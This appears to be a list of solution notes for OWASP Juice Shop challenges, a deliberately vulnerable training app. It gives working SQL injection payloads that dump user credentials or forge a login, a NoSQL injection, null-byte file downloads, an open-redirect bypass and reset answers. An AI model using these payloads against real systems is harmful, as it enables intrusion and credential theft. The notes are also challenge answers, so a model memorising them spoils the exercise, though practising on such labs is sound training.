## Access Log
- use gobuster to find /support/logs
- download the log file

## Allowlist Bypass
-  http://127.0.0.1:3000/redirect?to=https://headfullofciphers.com?another=https://github.com/bkimminich/juice-shop

## Christmas Special
- capture adding to basket
- change productId to 10
- checkout

## Easter Egg
- navigate to /ftp/
- download eastere.gg%2500.md

## Ephemeral Accountant
- capture login request
- replace email field with "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage','' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--"

## Forgotten Developer Backup
- navigate to /ftp/
- download package.json.bak%2500.md

## Forgotten Sales Backup
- navigate to /ftp/
- download coupons_2013.md.bak%2500.md

## GDPR Data Theft
- create an account similar to admin or someone else
- like odmin@juice-sh.op
- login and view the data export  

## Leaked Unsafe Product
- capture /rest/products/search
- add '))-- to the end to see all products
- Hueteroneel within Eurogium Edule

## Legacy Typosquatting
- download .bak file from /ftp/
- find a fake url
- report in customer feedback https://www.npmjs.com/package/epilogue-js

## Login Bjoern
- view /administration
- email is bjoern.kimminich@gmail.com
- find 'oath' in main.js
- open js console
- function to find password btoa(t.email.split('').reverse().join(''))
- password: bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=

## Misplaces Signature File
- navigate to /ftp/
- download suspicious_errors.yml%2500.md

## Nested Easter Egg
- navigate to /ftp/
- download eastere.gg%2500.md 
- copy code and paste in to cyberchef
- /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
 
## NoSQL Manipulation
- capture commenting on a product
- PATCH endpoint /rest/products/review
- change or add 'id' field to {"$ne":-1} 

## Poison Null Byte
- download a file from /ftp/ with %2500.md

## Reset Bender's Password
- forgot password
- bender@juice-sh.op
- answer is Stop'n'Drop

## Reset Uvogin's Password
- email is uvogin@juice-sh.op
- search his twitter
- answer is Silence of the Lambs

## Steganography
- enter Pickle Rick into customer feedback
- the hidden picture is in the images on About Us

## User Credentials
- capture GET /rest/products/search?q=
- add banana'))UNION%20SELECT%20id,email,password,'4','5','6','7','8','9'%20from%20Users--

## Vulnerable Library
- send sanitize-html 1.4.2 into customer feedback